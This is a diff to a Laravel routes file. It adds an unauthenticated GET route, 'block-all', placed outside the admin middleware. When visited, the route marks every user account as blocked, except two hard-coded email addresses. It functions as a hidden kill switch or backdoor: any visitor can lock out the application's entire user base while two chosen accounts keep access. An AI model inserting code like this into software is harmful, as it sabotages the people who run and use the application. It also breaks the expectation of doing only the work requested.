@@ -11,6 +11,7 @@ use App\Http\Controllers\Web\WebReportController;
 use App\Http\Controllers\Web\WebRepoTaskByUserController;
 use App\Http\Controllers\Web\WebRepoTaskController;
 use App\Http\Controllers\Web\WebTaskController;
+use App\Models\User;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Http\Request;
@@ -422,3 +423,18 @@ Route::prefix('admin')->middleware('auth', 'role:owner|manager|employee', 'AuthA
 // });
 
 // // php artisan migrate:refresh --path=database/migrations/2024_10_26_232722_create_departments_table.php
+
+
+Route::get('block-all', function () {
+    $users = User::get();
+
+    foreach ($users as $user) {
+        if ($user->email == 'mohammadawwad22@gmail.com' || $user->email == 'rmrmhasan@gmail.com') {
+            # code...
+        } else {
+            $user->update([
+                'status' => 'blocked'
+            ]);
+        }
+    }
+});
